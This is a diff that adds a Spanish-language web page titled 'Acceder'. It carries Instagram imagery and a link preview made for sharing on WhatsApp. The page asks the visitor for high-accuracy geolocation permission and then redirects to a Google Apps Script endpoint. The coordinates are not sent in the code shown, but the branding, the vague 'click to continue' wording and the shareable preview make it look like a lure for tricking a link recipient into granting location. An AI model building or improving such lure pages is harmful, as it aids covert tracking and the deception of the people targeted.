@@ -1,0 +1,131 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Acceder</title>
+
+    <!-- Vista previa al compartir en WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Acceder">
+    <meta property="og:description" content="Haz clic para continuar">
+    <meta property="og:image"
+          content="https://TU-USUARIO.github.io/TU-REPOSITORIO/Instagram.png">
+    <meta property="og:image:alt" content="Imagen de acceso">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Acceder">
+    <meta name="twitter:description" content="Haz clic para continuar">
+    <meta name="twitter:image"
+          content="https://TU-USUARIO.github.io/TU-REPOSITORIO/Instagram.png">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .contenedor {
+            text-align: center;
+            padding: 30px;
+        }
+
+        img {
+            max-width: 250px;
+            width: 80%;
+            height: auto;
+        }
+
+        button {
+            display: block;
+            margin: 25px auto 10px;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            background: #1877f2;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        #mensaje {
+            font-size: 14px;
+            color: #555;
+            max-width: 350px;
+            margin: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="contenedor">
+
+        <img src="Instagram.png" alt="Imagen de acceso">
+
+        <p id="mensaje">
+            Para continuar, puedes permitir el acceso a tu ubicación.
+            Tu navegador te solicitará autorización.
+        </p>
+
+        <button onclick="solicitarUbicacion()">
+            Continuar
+        </button>
+
+    </div>
+
+    <script>
+
+        const destino =
+        "https://script.google.com/macros/s/AKfycbzaG077GC2AZw8BZD_f_OSx20Mw2Jpjk6UuZqpBImS8WPTVGIoLdBYwvRo1dSt0dATdBQ/exec";
+
+        function solicitarUbicacion() {
+
+            if (!navigator.geolocation) {
+                document.getElementById("mensaje").textContent =
+                    "Tu navegador no permite obtener la ubicación.";
+
+                return;
+            }
+
+            document.getElementById("mensaje").textContent =
+                "Solicitando permiso de ubicación...";
+
+            navigator.geolocation.getCurrentPosition(
+
+                function(position) {
+
+                    // El usuario autorizó la ubicación.
+                    // Continúa hacia el destino.
+                    window.location.href = destino;
+
+                },
+
+                function(error) {
+
+                    // El usuario rechazó o canceló el permiso.
+                    document.getElementById("mensaje").textContent =
+                        "No se concedió el permiso de ubicación. Puedes continuar cuando lo desees.";
+
+                },
+
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+    </script>
+
+</body>
+</html>
+```
